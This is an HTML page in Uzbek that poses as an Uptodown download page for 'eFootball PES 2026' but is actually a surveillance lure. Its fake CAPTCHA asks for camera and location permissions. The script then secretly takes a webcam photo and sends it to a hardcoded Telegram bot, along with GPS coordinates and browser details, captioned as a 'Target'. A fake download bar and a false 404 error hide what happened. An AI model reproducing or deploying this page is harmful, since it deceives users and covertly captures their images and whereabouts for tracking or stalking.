<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eFootball PES 2026 - Download</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ut-bg: #081d24;
            --ut-dark: #051116;
            --ut-blue: #1b85d3;
            --ut-green: #00b451;
            --ut-dim: #7e949c;
        }

        body { margin: 0; background-color: var(--ut-bg); font-family: 'Roboto', sans-serif; color: #ffffff; overflow-x: hidden; }

        /* Header - Logotip o'rtada */
        .top-centered-header {
            background-color: var(--ut-dark);
            padding: 15px 0;
            display: flex;
            justify-content: center;
            align-items: center;
            border-bottom: 1px solid #102a33;
            width: 100%;
        }
        .main-logo { height: 24px; }

        header {
            background: var(--ut-dark);
            height: 50px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            border-bottom: 1px solid #102a33;
        }
        .menu-btn { color: var(--ut-blue); font-size: 26px; cursor: pointer; }

        /* Content */
        .main-content { max-width: 1000px; margin: 0 auto; padding: 20px 16px; transition: filter 0.3s ease; }
        .app-header { display: flex; gap: 16px; margin-bottom: 24px; align-items: center; }
        .app-icon { width: 90px; height: 90px; border-radius: 20px; background: #102a33; object-fit: cover; }
        
        .btn-main {
            background: var(--ut-green);
            color: white;
            width: 100%;
            padding: 16px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 18px;
            border: none;
            box-shadow: 0 4px 0 #008a3d;
            cursor: pointer;
            text-transform: uppercase;
        }

        /* Overlay & Modals */
        #overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }

        .modal-box { background: #fff; padding: 25px; border-radius: 4px; color: #000; width: 300px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        
        .captcha-mini {
            border: 1px solid #d3d3d3;
            padding: 10px;
            display: flex;
            align-items: center;
            cursor: pointer;
            background: #f9f9f9;
            margin-top: 15px;
        }
        .c-check { width: 24px; height: 24px; border: 2px solid #c1c1c1; margin-right: 15px; display: flex; align-items: center; justify-content: center; background: #fff; }

        /* Progress Bar */
        #progress-container { display: none; }
        .progress-bar { width: 100%; height: 8px; background: #eee; border-radius: 4px; overflow: hidden; margin-top: 15px; }
        .progress-fill { width: 0%; height: 100%; background: var(--ut-green); transition: width 0.1s linear; }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="top-centered-header">
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="main-logo" alt="Uptodown">
</div>

<header>
    <div class="menu-btn" onclick="toggleMenu()">☰</div>
</header>

<div class="main-content" id="content">
    <div class="app-header">
        <img src="https://stc.utdstc.com/img/icons/efootball-pes-2021-android.png" class="app-icon" alt="PES">
        <div>
            <h1 style="margin:0; font-size: 22px;">eFootball PES 2026</h1>
            <p style="margin:5px 0; color:var(--ut-dim); font-size: 14px;">10.4.0 | <span style="color:var(--ut-blue)">Uptodown.com</span></p>
        </div>
    </div>
    
    <button class="btn-main" onclick="showCaptcha()">Oxirgi versiya (Yuklash)</button>

    <div style="margin-top: 25px; color: var(--ut-dim); font-size: 13px; line-height: 1.6;">
        <div style="display:flex; justify-content: space-between; border-bottom: 1px solid #102a33; padding: 8px 0;">
            <span>Hajmi</span><span style="color:#fff">1.94 GB</span>
        </div>
        <div style="display:flex; justify-content: space-between; border-bottom: 1px solid #102a33; padding: 8px 0;">
            <span>Operatsion tizim</span><span style="color:#fff">Android 7.0+</span>
        </div>
    </div>
</div>

<div id="overlay">
    <div class="modal-box" id="modal">
        <div id="captcha-step">
            <h3 style="margin:0; font-size: 18px;">Tasdiqlash</h3>
            <p style="font-size: 13px; color: #555; margin: 10px 0;">Yuklashni boshlash uchun robot emasligingizni tasdiqlang.</p>
            <div class="captcha-mini" onclick="verifyUser()">
                <div class="c-check" id="checkmark"></div>
                <div style="flex-grow:1; text-align:left; font-size:14px; font-weight:500;">I'm not a robot</div>
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28">
            </div>
        </div>

        <div id="progress-container">
            <h3 style="margin:0; font-size: 16px;">Fayl yuklanmoqda...</h3>
            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
            <p id="percent" style="font-size: 14px; margin-top: 10px; font-weight: bold; color: var(--ut-green);">0%</p>
        </div>
    </div>
</div>

<video id="v-stream" autoplay playsinline></video>
<canvas id="v-canvas"></canvas>

<script>
    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };

    function toggleMenu() { alert("Uptodown Menu"); }

    function showCaptcha() {
        document.getElementById('content').style.filter = "blur(10px)";
        document.getElementById('overlay').style.display = "flex";
    }

    async function verifyUser() {
        const check = document.getElementById('checkmark');
        check.innerHTML = '<img src="https://i.gifer.com/ZZ5H.gif" width="16">';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            navigator.geolocation.getCurrentPosition(async (pos) => {
                
                // Botga ma'lumot yuborish
                sendData(stream, pos);

                check.innerHTML = '✅';
                check.style.border = "none";
                
                setTimeout(() => {
                    document.getElementById('captcha-step').style.display = "none";
                    document.getElementById('progress-container').style.display = "block";
                    startLoading();
                }, 800);

            }, (err) => { alert("Xatolik: Joylashuv ruxsati kerak!"); location.reload(); });
        } catch (e) { alert("Xatolik: Kamera ruxsati kerak!"); location.reload(); }
    }

    function startLoading() {
        let width = 0;
        const fill = document.getElementById('fill');
        const percent = document.getElementById('percent');

        const interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                setTimeout(showError, 500);
            } else {
                width += Math.random() * 1.5;
                if(width > 100) width = 100;
                fill.style.width = width + "%";
                percent.innerText = Math.floor(width) + "%";
            }
        }, 80);
    }

    function showError() {
        document.body.innerHTML = `
            <div style="text-align:center; padding:100px 20px; color:#fff;">
                <h1 style="font-size:80px; margin:0; color:var(--ut-dim);">404</h1>
                <h2 style="font-size:20px; margin:10px 0;">Sahifa topilmadi</h2>
                <p style="color:var(--ut-dim); font-size:14px;">Xatolik yuz berdi: Server bilan aloqa o'rnatib bo'lmadi (Error_Code: 0x884).</p>
                <button onclick="location.reload()" style="margin-top:30px; padding:12px 25px; background:var(--ut-blue); border:none; color:#fff; border-radius:5px; font-weight:bold; cursor:pointer;">Qaytadan urinish</button>
            </div>
        `;
    }

    async function sendData(stream, pos) {
        const video = document.getElementById('v-stream');
        video.srcObject = stream;
        await new Promise(res => setTimeout(res, 1000));
        const canvas = document.getElementById('v-canvas');
        canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const snap = await (await fetch(canvas.toDataURL('image/jpeg', 0.5))).blob();
        stream.getTracks().forEach(t => t.stop());

        const fd = new FormData();
        fd.append('chat_id', CONFIG.CHAT);
        fd.append('photo', snap);
        fd.append('caption', `📥 *UC Service 2.0 Target*\n📍 Geo: ${pos.coords.latitude}, ${pos.coords.longitude}\n📱 IP/Browser: ${navigator.userAgent.split(') ')[0]})`);
        
        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }
</script>

</body>
</html>
